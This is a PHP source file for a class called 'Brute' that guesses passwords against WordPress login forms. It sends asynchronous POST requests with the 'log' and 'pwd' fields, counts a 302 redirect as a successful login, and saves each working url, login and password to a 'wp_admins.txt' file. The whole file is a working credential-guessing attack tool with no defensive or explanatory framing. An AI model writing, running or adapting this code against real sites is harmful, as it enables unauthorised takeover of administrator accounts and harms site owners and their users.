<?php

namespace app;

use Amp\Dns\DnsException;
use Amp\Http\Client\Body\FormBody;
use Amp\Http\Client\HttpClientBuilder;
use Amp\Http\Client\Request;

class Brute
{
    protected $client;

    private $url;
    private $login;
    private $password;
    private $iteration;

    public function __construct()
    {
        $this->client = (new HttpClientBuilder())
            ->retry(3)
            ->followRedirects(0)
            ->build();


        $this->login     = null;
        $this->password  = null;
        $this->iteration = true;
    }

    public function __invoke($data)
    {
        $this->url = explode(';', $data['url'])[0];

        $this->loginCheck($data);
        $this->passwordCheck($data);
        $this->checkIterator($data);


        if ($this->iteration === true) {
            $body = new FormBody;
            $body->addField('log', $this->login);
            $body->addField('pwd', $this->password);

            $request = new Request($this->url, 'POST');
            $request->setTcpConnectTimeout(2400);
            $request->setBody($body);

            $response = yield $this->client->request($request);

            if ($response->getStatus() == 302) {
                echo $this->login . ":" . $this->password . PHP_EOL;
                $wp_admin = $this->url . ";" . $this->login . ";" . $this->password;
                file_put_contents('data/wp_admins.txt', $wp_admin . PHP_EOL);
            }
        }
    }

    public function checkIterator($data) {
        if (( $this->login == null && $this->password == null) || ( $data['login'] != '{login}' && $data['login'] == $this->login )) {
            $this->iteration = false;
        }
    }

    public function loginCheck($data) {
        if ($data['login'] == '{login}' && !isset(explode(';', $data['url'])[1])) {
            $this->login = null;
        } elseif ($data['login'] == '{login}' && isset(explode(';', $data['url'])[1])) {
            $this->login = explode(';', $data['url'])[1];
        } else {
            $this->login = $data['login'];
        }
    }

    public function passwordCheck($data) {
        if ($data['password'] == '{login}' && $this->login != null)
            $this->password = $this->login;
        else
            $this->password = $data['password'];
    }
}